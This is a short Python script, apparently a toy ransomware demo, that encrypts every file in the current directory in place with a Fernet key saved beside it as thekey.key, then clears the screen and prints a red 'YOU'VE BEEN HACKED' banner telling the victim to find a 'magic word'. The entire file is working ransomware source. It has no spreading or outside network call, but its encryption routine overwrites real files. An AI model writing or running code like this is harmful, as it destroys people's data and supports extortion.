import os
import logging
from cryptography.fernet import Fernet

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def find_files():
    """Find all non-excluded files in the current directory."""
    excluded_files = {"ransomware.py", "thekey.key", "decrypt.py"}
    return [f for f in os.listdir() if os.path.isfile(f) and f not in excluded_files]

def generate_key():
    """Generate and securely store an encryption key."""
    if os.path.exists("thekey.key"):
        with open("thekey.key", "rb") as key_file:
            key = key_file.read()
        logging.info("Existing key loaded from thekey.key")
    else:
        key = Fernet.generate_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(key)
        logging.info("New encryption key generated and saved to thekey.key")
    return key

def encrypt_files(files, key):
    """Encrypt the given files using the provided key."""
    cipher = Fernet(key)
    for file in files:
        with open(file, "rb") as f:
            file_data = f.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file, "wb") as f:
            f.write(encrypted_data)
    logging.info(f"Encrypted Files: {files}")

def dramatic_banner():
    """Prints a dramatic ASCII banner and changes console color."""
    # Change color of the console output to be more dramatic (Red)
    print("\033[91m")  # ANSI escape code for red

    print("All of your files have been encrypted!! Find the magic word to decrypt them.")

    # Print a big emoticon (ASCII art) to emphasize being 'hacked'.
    print(r"""
        
        ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ ██╗
        ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗██║
        ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║██║
        ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║╚═╝
        ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝██╗
        ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ ╚═╝
                                               
         Y O U ' V E   B E E N   H A C K E D !
    """)

    # Reset the color
    print("\033[0m")

def clear_console():
    """Clear the console screen on Windows or Unix-like systems."""
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def main():
    clear_console()
    files = find_files()
    key = generate_key()
    encrypt_files(files, key)
    dramatic_banner()

if __name__ == "__main__":
    main()
